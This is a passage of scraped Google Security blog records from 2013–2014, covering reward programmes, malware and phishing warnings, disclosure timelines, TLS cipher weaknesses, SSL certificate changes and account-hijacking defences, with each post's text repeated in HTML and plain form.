for complicated, high-impact improvements that almost certainly prevent major vulnerabilities in the affected code.  $5,000 for moderately complex patches that provide convincing security benefits. Between $500 and $1,337 for submissions that are very simple or that offer only fairly speculative gains.   We look forward to ongoing collaboration with the broader security community, and we'll continue to invest in these programs to help make the Internet a safer place for everyone.     ", "date": "February 4, 2014"},
{"website": "Google-Security", "title": "\nGoing beyond vulnerability rewards\n", "author": ["Posted by Michal Zalewski, Google Security Team"], "link": "https://security.googleblog.com/2013/10/going-beyond-vulnerability-rewards.html", "abstract": "                             Posted by Michal Zalewski, Google Security Team    We all benefit from the amazing volunteer work done by the open source community. That&#8217;s why we keep asking ourselves how to take the model pioneered with our  Vulnerability Reward Program  - and employ it to improve the security of key third-party software critical to the health of the entire Internet.    We thought about simply kicking off an OSS bug-hunting program, but this approach can easily backfire. In addition to valid reports, bug bounties invite a significant volume of spurious traffic - enough to completely overwhelm a small community of volunteers. On top of this, fixing a problem often requires more effort than finding it.    So we decided to try something new: provide financial incentives for down-to-earth, proactive improvements that go beyond merely fixing a known security bug. Whether you want to switch to a more secure allocator, to add privilege separation, to clean up a bunch of sketchy calls to strcat(), or even just to enable ASLR - we want to help!    We intend to roll out the program gradually, based on the quality of the received submissions and the feedback from the developer community. For the initial run, we decided to limit the scope to the following projects:       Core infrastructure network services: OpenSSH, BIND, ISC DHCP   Core infrastructure image parsers: libjpeg, libjpeg-turbo, libpng, giflib   Open-source foundations of Google Chrome: Chromium, Blink   Other high-impact libraries: OpenSSL, zlib   Security-critical, commonly used components of the Linux kernel (including KVM)    We intend to soon extend the program to:     Widely used web servers: Apache httpd, lighttpd, nginx  Popular SMTP services: Sendmail, Postfix, Exim  Toolchain security improvements for GCC, binutils, and llvm  Virtual private networking: OpenVPN     How to participate?    Before participating, please read the official rules posted on  this page ; the document provides additional information about eligibility, rewards, and other important stuff.    Please submit your patches directly to the maintainers of the individual projects. Once your patch is accepted and merged into the repository, please follow the submission process outlined  here . If we think that the submission has a demonstrable, positive impact on the security of the project, you will qualify for a reward ranging from $500 to $3,133.7.     Happy patching!                                       Posted by Michal Zalewski, Google Security Team  We all benefit from the amazing volunteer work done by the open source community. That’s why we keep asking ourselves how to take the model pioneered with our Vulnerability Reward Program - and employ it to improve the security of key third-party software critical to the health of the entire Internet.  We thought about simply kicking off an OSS bug-hunting program, but this approach can easily backfire. In addition to valid reports, bug bounties invite a significant volume of spurious traffic - enough to completely overwhelm a small community of volunteers. On top of this, fixing a problem often requires more effort than finding it.  So we decided to try something new: provide financial incentives for down-to-earth, proactive improvements that go beyond merely fixing a known security bug. Whether you want to switch to a more secure allocator, to add privilege separation, to clean up a bunch of sketchy calls to strcat(), or even just to enable ASLR - we want to help!  We intend to roll out the program gradually, based on the quality of the received submissions and the feedback from the developer community. For the initial run, we decided to limit the scope to the following projects:    Core infrastructure network services: OpenSSH, BIND, ISC DHCP  Core infrastructure image parsers: libjpeg, libjpeg-turbo, libpng, giflib  Open-source foundations of Google Chrome: Chromium, Blink  Other high-impact libraries: OpenSSL, zlib  Security-critical, commonly used components of the Linux kernel (including KVM)   We intend to soon extend the program to:   Widely used web servers: Apache httpd, lighttpd, nginx Popular SMTP services: Sendmail, Postfix, Exim Toolchain security improvements for GCC, binutils, and llvm Virtual private networking: OpenVPN   How to participate?  Before participating, please read the official rules posted on this page; the document provides additional information about eligibility, rewards, and other important stuff.  Please submit your patches directly to the maintainers of the individual projects. Once your patch is accepted and merged into the repository, please follow the submission process outlined here. If we think that the submission has a demonstrable, positive impact on the security of the project, you will qualify for a reward ranging from $500 to $3,133.7.   Happy patching!       ", "date": "October 9, 2013"},
{"website": "Google-Security", "title": "\nDon’t mess with my browser! \n", "author": [], "link": "https://security.googleblog.com/2013/10/dont-mess-with-my-browser.html", "abstract": "                             In some ways, it's safer than ever to be online &#8212; especially if you use Chrome. With  continued security research  and seamless automatic updates, your browsing experience is always getting better and more secure. But recently you may have noticed something seems amiss. Online criminals have been increasing their use of malicious software that can silently hijack your browser settings. This has become a  top issue in the Chrome help forums ; we're listening and are here to help.       Bad guys trick you into installing and running this kind of software by bundling it with something you might want, like a free screensaver, a video plugin or&#8212;ironically&#8212;a  supposed security update . These malicious programs disguise themselves so you won&#8217;t know they&#8217;re there and they may change your homepage or inject ads into the sites you browse. Worse, they block your ability to change your settings back and make themselves hard to uninstall, keeping you trapped in an undesired state.      We're taking steps to help, including adding a  \"reset browser settings\" button  in the last Chrome update, which lets you easily return your Chrome to a factory-fresh state. You can find this in the &#8220;Advanced Settings&#8221; section of Chrome settings.             &nbsp;              In the current  Canary build  of Chrome, we&#8217;ll automatically block downloads of malware that we detect. If you see this message in the download tray at the bottom of your screen, you can click &#8220;Dismiss&#8221; knowing Chrome is working to keep you safe.             &nbsp;           This is in addition to the 10,000 new websites we flag per day with&nbsp; Safe Browsing ,&nbsp;which also detects and blocks malicious downloads, to keep more than 1 billion web users safe across multiple browsers that use this technology. Keeping you secure is a top priority, which is why we&#8217;re working on additional means to  stop malicious software installs  as well.       Update: 11/1/13: Updated to mention that Safe Browsing  already detects and blocks malware .       Linus Upson, Vice President                                          In some ways, it's safer than ever to be online — especially if you use Chrome. With continued security research and seamless automatic updates, your browsing experience is always getting better and more secure. But recently you may have noticed something seems amiss. Online criminals have been increasing their use of malicious software that can silently hijack your browser settings. This has become a top issue in the Chrome help forums; we're listening and are here to help.   Bad guys trick you into installing and running this kind of software by bundling it with something you might want, like a free screensaver, a video plugin or—ironically—a supposed security update. These malicious programs disguise themselves so you won’t know they’re there and they may change your homepage or inject ads into the sites you browse. Worse, they block your ability to change your settings back and make themselves hard to uninstall, keeping you trapped in an undesired state.    We're taking steps to help, including adding a \"reset browser settings\" button in the last Chrome update, which lets you easily return your Chrome to a factory-fresh state. You can find this in the “Advanced Settings” section of Chrome settings.            In the current Canary build of Chrome, we’ll automatically block downloads of malware that we detect. If you see this message in the download tray at the bottom of your screen, you can click “Dismiss” knowing Chrome is working to keep you safe.          This is in addition to the 10,000 new websites we flag per day with Safe Browsing, which also detects and blocks malicious downloads, to keep more than 1 billion web users safe across multiple browsers that use this technology. Keeping you secure is a top priority, which is why we’re working on additional means to stop malicious software installs as well.    Update: 11/1/13: Updated to mention that Safe Browsing already detects and blocks malware.   Linus Upson, Vice President      ", "date": "October 31, 2013"},
{"website": "Google-Security", "title": "\nIranian phishing on the rise as elections approach\n", "author": ["Posted by Eric Grosse, VP Security Engineering"], "link": "https://security.googleblog.com/2013/06/iranian-phishing-on-rise-as-elections.html", "abstract": "                             Posted by Eric Grosse, VP Security Engineering      [Update June 13: This post is available in Farsi on the  Google Persian Blog .]     For almost three weeks, we have detected and disrupted multiple email-based phishing campaigns aimed at compromising the accounts owned by tens of thousands of Iranian users. These campaigns, which originate from within Iran, represent a significant jump in the overall volume of phishing activity in the region. The timing and targeting of the campaigns suggest that the attacks are politically motivated in connection with the Iranian presidential election on Friday.             Our Chrome browser previously helped detect what appears to be the same group using SSL certificates to conduct attacks that  targeted users within Iran . In this case, the phishing technique we detected is more routine: users receive an email containing a link to a web page that purports to provide a way to perform account maintenance. If the user clicks the link, they see a fake Google sign-in page that will steal their username and password.    Protecting our users&#8217; accounts is one of our top priorities, so we notify targets of  state-sponsored attacks  and other  suspicious activity , and we take other appropriate actions to limit the impact of these attacks on our users. Especially if you are in Iran, we encourage you to  take extra steps to protect your account . Watching out for phishing, using a modern browser like Chrome and  enabling 2-step verification  can make you significantly more secure against these and many other types of attacks. Also, before typing your Google password, always verify that the URL in the address bar of your browser begins with https://accounts.google.com/. If the website's address does not match this text, please don&#8217;t enter your Google password.                                   Posted by Eric Grosse, VP Security Engineering  [Update June 13: This post is available in Farsi on the Google Persian Blog.]  For almost three weeks, we have detected and disrupted multiple email-based phishing campaigns aimed at compromising the accounts owned by tens of thousands of Iranian users. These campaigns, which originate from within Iran, represent a significant jump in the overall volume of phishing activity in the region. The timing and targeting of the campaigns suggest that the attacks are politically motivated in connection with the Iranian presidential election on Friday.     Our Chrome browser previously helped detect what appears to be the same group using SSL certificates to conduct attacks that targeted users within Iran. In this case, the phishing technique we detected is more routine: users receive an email containing a link to a web page that purports to provide a way to perform account maintenance. If the user clicks the link, they see a fake Google sign-in page that will steal their username and password.  Protecting our users’ accounts is one of our top priorities, so we notify targets of state-sponsored attacks and other suspicious activity, and we take other appropriate actions to limit the impact of these attacks on our users. Especially if you are in Iran, we encourage you to take extra steps to protect your account. Watching out for phishing, using a modern browser like Chrome and enabling 2-step verification can make you significantly more secure against these and many other types of attacks. Also, before typing your Google password, always verify that the URL in the address bar of your browser begins with https://accounts.google.com/. If the website's address does not match this text, please don’t enter your Google password.     ", "date": "June 12, 2013"},
{"website": "Google-Security", "title": "\nDisclosure timeline for vulnerabilities under active attack\n", "author": ["Posted by Chris Evans and Drew Hintz, Security Engineers"], "link": "https://security.googleblog.com/2013/05/disclosure-timeline-for-vulnerabilities.html", "abstract": "                             Posted by Chris Evans and Drew Hintz, Security Engineers     We recently discovered that attackers are actively targeting a previously unknown and unpatched vulnerability in software belonging to another company. This isn&#8217;t an isolated incident -- on a semi-regular basis, Google security researchers uncover real-world exploitation of publicly unknown (&#8220;zero-day&#8221;) vulnerabilities. We always report these cases to the affected vendor immediately, and we work closely with them to drive the issue to resolution. Over the years, we&#8217;ve reported dozens of actively exploited zero-day vulnerabilities to affected vendors, including  XML parsing vulnerabilities ,  universal cross-site scripting bugs , and  targeted web application attacks .    Often, we find that zero-day vulnerabilities are used to target a limited subset of people. In many cases, this targeting actually makes the attack more serious than a broader attack, and more urgent to resolve quickly. Political activists are frequent targets, and the consequences of being compromised can have real safety implications in parts of the world.    Our standing  recommendation  is that companies should fix critical vulnerabilities within 60 days -- or, if a fix is not possible, they should notify the public about the risk and offer workarounds. We encourage researchers to publish their findings if reported issues will take longer to patch. Based on our experience, however, we believe that more urgent action -- within 7 days -- is appropriate for critical vulnerabilities under active exploitation. The reason for this special designation is that each day an actively exploited vulnerability remains undisclosed to the public and unpatched, more computers will be compromised.     Seven days is an aggressive timeline and may be too short for some vendors to update their products, but it should be enough time to publish advice about possible mitigations, such as temporarily disabling a service, restricting access, or contacting the vendor for more information. As a result, after 7 days have elapsed without a patch or advisory, we will support researchers making details available so that users can take steps to protect themselves. By holding ourselves to the same standard, we hope to improve both the state of web security and the coordination of vulnerability management.                                   Posted by Chris Evans and Drew Hintz, Security Engineers  We recently discovered that attackers are actively targeting a previously unknown and unpatched vulnerability in software belonging to another company. This isn’t an isolated incident -- on a semi-regular basis, Google security researchers uncover real-world exploitation of publicly unknown (“zero-day”) vulnerabilities. We always report these cases to the affected vendor immediately, and we work closely with them to drive the issue to resolution. Over the years, we’ve reported dozens of actively exploited zero-day vulnerabilities to affected vendors, including XML parsing vulnerabilities, universal cross-site scripting bugs, and targeted web application attacks.  Often, we find that zero-day vulnerabilities are used to target a limited subset of people. In many cases, this targeting actually makes the attack more serious than a broader attack, and more urgent to resolve quickly. Political activists are frequent targets, and the consequences of being compromised can have real safety implications in parts of the world.  Our standing recommendation is that companies should fix critical vulnerabilities within 60 days -- or, if a fix is not possible, they should notify the public about the risk and offer workarounds. We encourage researchers to publish their findings if reported issues will take longer to patch. Based on our experience, however, we believe that more urgent action -- within 7 days -- is appropriate for critical vulnerabilities under active exploitation. The reason for this special designation is that each day an actively exploited vulnerability remains undisclosed to the public and unpatched, more computers will be compromised.   Seven days is an aggressive timeline and may be too short for some vendors to update their products, but it should be enough time to publish advice about possible mitigations, such as temporarily disabling a service, restricting access, or contacting the vendor for more information. As a result, after 7 days have elapsed without a patch or advisory, we will support researchers making details available so that users can take steps to protect themselves. By holding ourselves to the same standard, we hope to improve both the state of web security and the coordination of vulnerability management.     ", "date": "May 29, 2013"},
{"website": "Google-Security", "title": "\nA roster of TLS cipher suites weaknesses\n", "author": ["Posted by Adam Langley, Software Engineer"], "link": "https://security.googleblog.com/2013/11/a-roster-of-tls-cipher-suites-weaknesses.html", "abstract": "                             Posted by Adam Langley, Software Engineer     SSL/TLS combines a number of choices about cryptographic primitives, including the choice of cipher, into a collection that it calls a &#8220;cipher suite.&#8221; A  list of cipher suites  is maintained by the Internet Assigned Names and Numbers Authority.    Because of recent research, this area of TLS is currently in flux as older, flawed, cipher suites are deprecated and newer replacements introduced into service. In this post we&#8217;ll be discussing known flaws in some of them.    Cipher suites are written like this: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA, which breaks down into the following parts:       ECDHE: the key agreement mechanism.&nbsp;   RSA: the authentication mechanism.&nbsp;   AES_128_CBC: the cipher.&nbsp;   SHA: the message authentication primitive.&nbsp;    For this discussion, only the &#8216;cipher&#8217; part of the cipher suite is pertinent.     RC4     RC4 is a very common stream cipher but is showing its 26-year age.    Biases in the RC4 keystream have been known for over a decade or more [ 1 ][ 2 ][ 3 ][ 4 ] and were used to attack WEP, the original security standard for Wi-Fi. HTTPS was believed to be substantially unaffected by these results until Paterson et al compiled and extended them [ 5 ] and demonstrated that belief to be incorrect.    The best, known attack against using RC4 with HTTPS involves causing a browser to transmit many HTTP requests -- each with the same cookie -- and exploiting known biases in RC4 to build an increasingly precise probability distribution for each byte in a cookie. However, the attack needs to see on the order of 10 billion copies of the cookie in order to make a good guess. This involves the browser sending ~7TB of data. In ideal situations, this requires nearly three months to complete.    This attack cannot be mitigated without replacing RC4.     AES-CBC&nbsp;     AES-CBC has a couple of problems, both of which are problems with the way that TLS uses CBC (Cipher Block Chaining) mode, and not problems with AES.    The first is called  BEAST  and was demonstrated by Duong and Rizzo 2011 (although the idea was originally  described  by Rogaway in 1995). It exploits a flaw in the way that TLS prior to version 1.1 generated CBC initialization vectors.    The attack requires precise control over the TLS connection which is not generally possible from a vanilla browser; the demo used a Java applet to obtain this control. The version of the WebSockets protocol used at the time may have allowed the necessary degree of control, but that had already been replaced by the time that the issue was demonstrated.    However, browsers are complex and evolving pieces of software, and the necessary degree of control is certainly not a comfortable barrier to exploitation. If possible, the exploit is very practical. It requires the attacker to have access to the network near the computer but otherwise completes quickly and deterministically.    The issue is fixed either by using TLS &gt;= 1.1, or by a trick called 1/n-1 record splitting, which has been implemented by all major browsers now. However, many older installations may still exist with Java enabled and would thus be vulnerable to this attack.    The second issue is called  Lucky13 . This attack uses the fact that TLS servers take a slightly different amount of time to process different types of invalid TLS records. This attack is the first one that we have discussed that requires the use of timing side-channels and is thus probabilistic.    The attack needs nearly 10,000 TLS connections per byte of plaintext decoded and the attacker needs to be situated close to the TLS server in order to reduce the amount of timing noise added by the network. Under absolutely ideal situations, an attacker could extract a short (16 byte) cookie from a victim's browser in around 10 minutes. With optimistic but plausible parameters, the attack could work in an hour.    This attack can only be fixed at the server by making the decoding of all CBC records take a constant amount of time. It&#8217;s not plausible for a browser to detect whether a server has fixed this issue before using AES-CBC.     AES-GCM&nbsp;     There are no known breaks of AES-GCM and it is one of the ciphers that TLS servers are urged to support. However it suffers from a couple of practical issues:    The first is that it&#8217;s very challenging to implement AES-GCM in software in a way which is both fast and secure. Some CPUs implement AES-GCM directly in hardware (this is called AES-NI by Intel, the most prominent example of this) and these CPUs allow for implementations that are secure and very fast, but hardware support is far from ubiquitous.    The second nit with AES-GCM is that, as integrated in TLS, implementations are free to use a random nonce value. However, the size of this nonce (8 bytes) is too small to safely support using this mode. Implementations that do so are at risk of a catastrophic nonce reuse after sending on the order of a terabyte of data on a single connection. This issue can be resolved by using a counter for the nonce but using random nonces is the most common practice at this time.    When both parties to a TLS connection support hardware AES-GCM and use counters, this cipher is essentially optimal.     ChaCha20-Poly1305&nbsp;     This cipher (technically an AEAD, not a cipher, as is AES-GCM) also has no known breaks but is designed to facilitate fast and secure software implementations. For situations where hardware AES-GCM support is not available, it provides a fast alternative. Even when AES-GCM hardware is provided, ChaCha20-Poly1305 is currently within a factor of two in speed.     Summary&nbsp;      While we recommend the world move to support TLS 1.2, AES-GCM and ChaCha20-Poly1305 (as Chrome and Google are doing) we have to deal with a large fraction of the Internet that moves more slowly than we would like. While RC4 is fundamentally flawed and must be replaced, the attacks against it are very costly. The attacks against CBC mode, however, are much more practical and only one can be conclusively addressed on the client side. It is not clear which is best when nothing better is available.    TLS 1.2 is needed in order to use AES-GCM and ChaCha20-Poly1305. TLS 1.2 deployment is hampered by older servers that fail to process valid TLS messages and thus break version negotiation. It also remains to be seen whether firewalls and other network intermediaries are erroneously processing TLS connections that pass through them, breaking TLS 1.2. Chrome 32 includes an experiment that tests for this issue. If TLS 1.2 is found to be viable on the modern Internet, remedial measures can be taken to repair the TLS version negotiation without breaking the previously mentioned, flawed TLS servers.                                   Posted by Adam Langley, Software Engineer  SSL/TLS combines a number of choices about cryptographic primitives, including the choice of cipher, into a collection that it calls a “cipher suite.” A list of cipher suites is maintained by the Internet Assigned Names and Numbers Authority.  Because of recent research, this area of TLS is currently in flux as older, flawed, cipher suites are deprecated and newer replacements introduced into service. In this post we’ll be discussing known flaws in some of them.  Cipher suites are written like this: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA, which breaks down into the following parts:   ECDHE: the key agreement mechanism.  RSA: the authentication mechanism.  AES_128_CBC: the cipher.  SHA: the message authentication primitive.   For this discussion, only the ‘cipher’ part of the cipher suite is pertinent.  RC4  RC4 is a very common stream cipher but is showing its 26-year age.  Biases in the RC4 keystream have been known for over a decade or more [1][2][3][4] and were used to attack WEP, the original security standard for Wi-Fi. HTTPS was believed to be substantially unaffected by these results until Paterson et al compiled and extended them [5] and demonstrated that belief to be incorrect.  The best, known attack against using RC4 with HTTPS involves causing a browser to transmit many HTTP requests -- each with the same cookie -- and exploiting known biases in RC4 to build an increasingly precise probability distribution for each byte in a cookie. However, the attack needs to see on the order of 10 billion copies of the cookie in order to make a good guess. This involves the browser sending ~7TB of data. In ideal situations, this requires nearly three months to complete.  This attack cannot be mitigated without replacing RC4.  AES-CBC   AES-CBC has a couple of problems, both of which are problems with the way that TLS uses CBC (Cipher Block Chaining) mode, and not problems with AES.  The first is called BEAST and was demonstrated by Duong and Rizzo 2011 (although the idea was originally described by Rogaway in 1995). It exploits a flaw in the way that TLS prior to version 1.1 generated CBC initialization vectors.  The attack requires precise control over the TLS connection which is not generally possible from a vanilla browser; the demo used a Java applet to obtain this control. The version of the WebSockets protocol used at the time may have allowed the necessary degree of control, but that had already been replaced by the time that the issue was demonstrated.  However, browsers are complex and evolving pieces of software, and the necessary degree of control is certainly not a comfortable barrier to exploitation. If possible, the exploit is very practical. It requires the attacker to have access to the network near the computer but otherwise completes quickly and deterministically.  The issue is fixed either by using TLS >= 1.1, or by a trick called 1/n-1 record splitting, which has been implemented by all major browsers now. However, many older installations may still exist with Java enabled and would thus be vulnerable to this attack.  The second issue is called Lucky13. This attack uses the fact that TLS servers take a slightly different amount of time to process different types of invalid TLS records. This attack is the first one that we have discussed that requires the use of timing side-channels and is thus probabilistic.  The attack needs nearly 10,000 TLS connections per byte of plaintext decoded and the attacker needs to be situated close to the TLS server in order to reduce the amount of timing noise added by the network. Under absolutely ideal situations, an attacker could extract a short (16 byte) cookie from a victim's browser in around 10 minutes. With optimistic but plausible parameters, the attack could work in an hour.  This attack can only be fixed at the server by making the decoding of all CBC records take a constant amount of time. It’s not plausible for a browser to detect whether a server has fixed this issue before using AES-CBC.  AES-GCM   There are no known breaks of AES-GCM and it is one of the ciphers that TLS servers are urged to support. However it suffers from a couple of practical issues:  The first is that it’s very challenging to implement AES-GCM in software in a way which is both fast and secure. Some CPUs implement AES-GCM directly in hardware (this is called AES-NI by Intel, the most prominent example of this) and these CPUs allow for implementations that are secure and very fast, but hardware support is far from ubiquitous.  The second nit with AES-GCM is that, as integrated in TLS, implementations are free to use a random nonce value. However, the size of this nonce (8 bytes) is too small to safely support using this mode. Implementations that do so are at risk of a catastrophic nonce reuse after sending on the order of a terabyte of data on a single connection. This issue can be resolved by using a counter for the nonce but using random nonces is the most common practice at this time.  When both parties to a TLS connection support hardware AES-GCM and use counters, this cipher is essentially optimal.  ChaCha20-Poly1305   This cipher (technically an AEAD, not a cipher, as is AES-GCM) also has no known breaks but is designed to facilitate fast and secure software implementations. For situations where hardware AES-GCM support is not available, it provides a fast alternative. Even when AES-GCM hardware is provided, ChaCha20-Poly1305 is currently within a factor of two in speed.  Summary    While we recommend the world move to support TLS 1.2, AES-GCM and ChaCha20-Poly1305 (as Chrome and Google are doing) we have to deal with a large fraction of the Internet that moves more slowly than we would like. While RC4 is fundamentally flawed and must be replaced, the attacks against it are very costly. The attacks against CBC mode, however, are much more practical and only one can be conclusively addressed on the client side. It is not clear which is best when nothing better is available.  TLS 1.2 is needed in order to use AES-GCM and ChaCha20-Poly1305. TLS 1.2 deployment is hampered by older servers that fail to process valid TLS messages and thus break version negotiation. It also remains to be seen whether firewalls and other network intermediaries are erroneously processing TLS connections that pass through them, breaking TLS 1.2. Chrome 32 includes an experiment that tests for this issue. If TLS 1.2 is found to be viable on the modern Internet, remedial measures can be taken to repair the TLS version negotiation without breaking the previously mentioned, flawed TLS servers.     ", "date": "November 14, 2013"},
{"website": "Google-Security", "title": "\nIncreased rewards for Google’s Web Vulnerability Reward Program\n", "author": ["Posted by Adam Mein and Michal Zalewski, Security Team"], "link": "https://security.googleblog.com/2013/06/increased-rewards-for-googles-web.html", "abstract": "                             Posted by Adam Mein and Michal Zalewski, Security Team     Our vulnerability reward programs have been very successful in helping us fix more bugs and better protect our users, while also strengthening our relationships with security researchers. Since  introducing  our reward program for web properties in November 2010, we&#8217;ve received over 1,500 qualifying vulnerability reports that span across Google&#8217;s services, as well as software written by companies we have acquired. We&#8217;ve paid $828,000 to more than 250 individuals, some of whom have doubled their total by donating their rewards to charity. For example, one of our bug finders decided to  support a school project  in East Africa.    In recognition of the difficulty involved in finding bugs in our most critical applications, we&#8217;re once again rolling out  updated rules  and significant reward increases for another group of bug categories:     Cross-site scripting (XSS) bugs on https://accounts.google.com now receive a reward of $7,500 (previously $3,133.7). Rewards for XSS bugs in other highly sensitive services such as Gmail and Google Wallet have been bumped up to $5,000 (previously $1,337), with normal Google properties increasing to $3,133.70 (previously $500).   The top reward for significant authentication bypasses / information leaks is now $7,500 (previously $5,000).    As always, happy bug hunting! If you do find a security problem, please  let us know .                                          Posted by Adam Mein and Michal Zalewski, Security Team  Our vulnerability reward programs have been very successful in helping us fix more bugs and better protect our users, while also strengthening our relationships with security researchers. Since introducing our reward program for web properties in November 2010, we’ve received over 1,500 qualifying vulnerability reports that span across Google’s services, as well as software written by companies we have acquired. We’ve paid $828,000 to more than 250 individuals, some of whom have doubled their total by donating their rewards to charity. For example, one of our bug finders decided to support a school project in East Africa.  In recognition of the difficulty involved in finding bugs in our most critical applications, we’re once again rolling out updated rules and significant reward increases for another group of bug categories:  Cross-site scripting (XSS) bugs on https://accounts.google.com now receive a reward of $7,500 (previously $3,133.7). Rewards for XSS bugs in other highly sensitive services such as Gmail and Google Wallet have been bumped up to $5,000 (previously $1,337), with normal Google properties increasing to $3,133.70 (previously $500). The top reward for significant authentication bypasses / information leaks is now $7,500 (previously $5,000).  As always, happy bug hunting! If you do find a security problem, please let us know.        ", "date": "June 6, 2013"},
{"website": "Google-Security", "title": "\nChanges to our SSL Certificates\n", "author": ["Posted by Stephen McHenry, Director of Information Security Engineering"], "link": "https://security.googleblog.com/2013/05/changes-to-our-ssl-certificates.html", "abstract": "                             Posted by Stephen McHenry, Director of Information Security Engineering     Protecting the security and privacy of our users is one of our most important tasks at Google, which is why we utilize encryption on almost all connections made to Google.    This encryption needs to be updated at times to make it even stronger, so this year our SSL services will undergo a series of certificate upgrades&#8212;specifically, all of our SSL certificates will be upgraded to 2048-bit keys by the end of 2013. We will begin switching to the new 2048-bit certificates on August 1st, to ensure adequate time for a careful rollout before the end of the year. We&#8217;re also going to change the root certificate that signs all of our SSL certificates because it has a 1024-bit key.    Most client software won&#8217;t have any problems with either of these changes, but we know that some configurations will require some extra steps to avoid complications. This is more often true of client software embedded in devices such as certain types of phones, printers, set-top boxes, gaming consoles, and cameras.    For a smooth upgrade, client software that makes SSL connections to Google (e.g. HTTPS)    must   :     Perform normal validation of the certificate chain;   Include a properly extensive set of root certificates contained. We have an example set which should be sufficient for connecting to Google in  our FAQ . (Note: the contents of this list may change over time, so clients should have a way to update themselves as changes occur);   Support Subject Alternative Names (SANs).    Also, clients   should   support the Server Name Indication (SNI) extension because clients may need to make an extra API call to set the hostname on an SSL connection. Any client unsure about SNI support can be tested against  https://googlemail.com &#8212;this URL should only validate if you are sending SNI.    On the flip side, here are some examples of improper validation practices that could very well lead to the inability of client software to connect to Google using SSL after the upgrade:     Matching the leaf certificate exactly (e.g. by hashing it)   Matching any other certificate (e.g. Root or Intermediate signing certificate) exactly   Hard-coding the expected Root certificate, especially in firmware. This is sometimes done based on assumptions like the following:     The Root Certificate of our chain will not change on short notice.   Google will always use Thawte as its Root CA.   Google will always use Equifax as its Root CA.   Google will always use one of a small number of Root CAs.   The certificate will always contain exactly the expected hostname in the Common Name field and therefore clients do not need to worry about SANs.   The certificate will always contain exactly the expected hostname in a SAN and therefore clients don't need to worry about wildcards.      Any software that contains these improper validation practices should be changed. More detailed information can be found in  this document , and you can also check out our  FAQ  if you have specific questions.                                   Posted by Stephen McHenry, Director of Information Security Engineering  Protecting the security and privacy of our users is one of our most important tasks at Google, which is why we utilize encryption on almost all connections made to Google.  This encryption needs to be updated at times to make it even stronger, so this year our SSL services will undergo a series of certificate upgrades—specifically, all of our SSL certificates will be upgraded to 2048-bit keys by the end of 2013. We will begin switching to the new 2048-bit certificates on August 1st, to ensure adequate time for a careful rollout before the end of the year. We’re also going to change the root certificate that signs all of our SSL certificates because it has a 1024-bit key.  Most client software won’t have any problems with either of these changes, but we know that some configurations will require some extra steps to avoid complications. This is more often true of client software embedded in devices such as certain types of phones, printers, set-top boxes, gaming consoles, and cameras.  For a smooth upgrade, client software that makes SSL connections to Google (e.g. HTTPS) must:  Perform normal validation of the certificate chain; Include a properly extensive set of root certificates contained. We have an example set which should be sufficient for connecting to Google in our FAQ. (Note: the contents of this list may change over time, so clients should have a way to update themselves as changes occur); Support Subject Alternative Names (SANs).  Also, clients should support the Server Name Indication (SNI) extension because clients may need to make an extra API call to set the hostname on an SSL connection. Any client unsure about SNI support can be tested against https://googlemail.com—this URL should only validate if you are sending SNI.  On the flip side, here are some examples of improper validation practices that could very well lead to the inability of client software to connect to Google using SSL after the upgrade:  Matching the leaf certificate exactly (e.g. by hashing it) Matching any other certificate (e.g. Root or Intermediate signing certificate) exactly Hard-coding the expected Root certificate, especially in firmware. This is sometimes done based on assumptions like the following:  The Root Certificate of our chain will not change on short notice. Google will always use Thawte as its Root CA. Google will always use Equifax as its Root CA. Google will always use one of a small number of Root CAs. The certificate will always contain exactly the expected hostname in the Common Name field and therefore clients do not need to worry about SANs. The certificate will always contain exactly the expected hostname in a SAN and therefore clients don't need to worry about wildcards.   Any software that contains these improper validation practices should be changed. More detailed information can be found in this document, and you can also check out our FAQ if you have specific questions.     ", "date": "May 23, 2013"},
{"website": "Google-Security", "title": "\nAn update on our war against account hijackers \n", "author": ["Posted by Mike Hearn, Google Security Engineer "], "link": "https://security.googleblog.com/2013/02/an-update-on-our-war-against-account.html", "abstract": "                             Posted by Mike Hearn, Google Security Engineer&nbsp;       Have you ever gotten a plea to wire money to a friend stranded at an international airport? An oddly written message from someone you haven&#8217;t heard from in ages? Compared to five years ago, more scams, illegal, fraudulent or spammy messages today come from someone you know. Although spam filters have become very powerful&#8212;in Gmail, less than 1 percent of spam emails make it into an inbox&#8212;these unwanted messages are much more likely to make it through if they come from someone you&#8217;ve been in contact with before. As a result, in 2010 spammers started changing their tactics&#8212;and we saw a large increase in fraudulent mail sent from Google Accounts. In turn, our security team has developed new ways to keep you safe, and dramatically reduced the amount of these messages.     Spammers&#8217; new trick&#8212;hijacking accounts&nbsp;   To improve their chances of beating a spam filter by sending you spam from your contact&#8217;s account, the spammer first has to break into that account. This means many spammers are turning into account thieves. Every day, cyber criminals break into websites to steal databases of usernames and passwords&#8212;the online &#8220;keys&#8221; to accounts. They put the databases up for sale on the black market, or use them for their own nefarious purposes. Because many people re-use the same password across different accounts, stolen passwords from one site are often valid on others.    With stolen passwords in hand, attackers attempt to break into accounts across the web and across many different services. We&#8217;ve seen a single attacker using stolen passwords to attempt to break into a million different Google accounts every single day, for weeks at a time. A different gang attempted sign-ins at a rate of more than 100 accounts per second. Other services are often more vulnerable to this type of attack, but when someone tries to log into your Google Account, our security system does more than just check that a password is correct.                  Legitimate accounts blocked for sending spam:&nbsp;   Our security systems have dramatically reduced the number of Google Accounts used to send spam over the past few years          How Google Security helps protect your account   Every time you sign in to Google, whether via your web browser once a month or an email program that checks for new mail every five minutes, our system performs a complex risk analysis to determine how likely it is that the sign-in really comes from you. In fact, there are more than 120 variables that can factor into how a decision is made.    If a sign-in is deemed suspicious or risky for some reason&#8212;maybe it&#8217;s coming from a country oceans away from your last sign-in&#8212;we ask some simple questions about your account. For example, we may ask for the phone number associated with your account, or for the answer to your security question. These questions are normally hard for a hijacker to solve, but are easy for the real owner. Using security measures like these, we've dramatically reduced the number of compromised accounts by 99.7 percent since the peak of these hijacking attempts in 2011.                   Help protect your account   While we do our best to keep spammers at bay, you can help protect your account by making sure you&#8217;re using a  strong, unique password  for your Google Account, upgrading your account to  use 2-step verification , and  updating the recovery options  on your account such as your secondary email address and your phone number. Following these three steps can help prevent your account from being hijacked&#8212;this means less spam for your friends and contacts, and improved security and privacy for you.    (Cross-posted from the Official Google Blog)                                   Posted by Mike Hearn, Google Security Engineer   Have you ever gotten a plea to wire money to a friend stranded at an international airport? An oddly written message from someone you haven’t heard from in ages? Compared to five years ago, more scams, illegal, fraudulent or spammy messages today come from someone you know. Although spam filters have become very powerful—in Gmail, less than 1 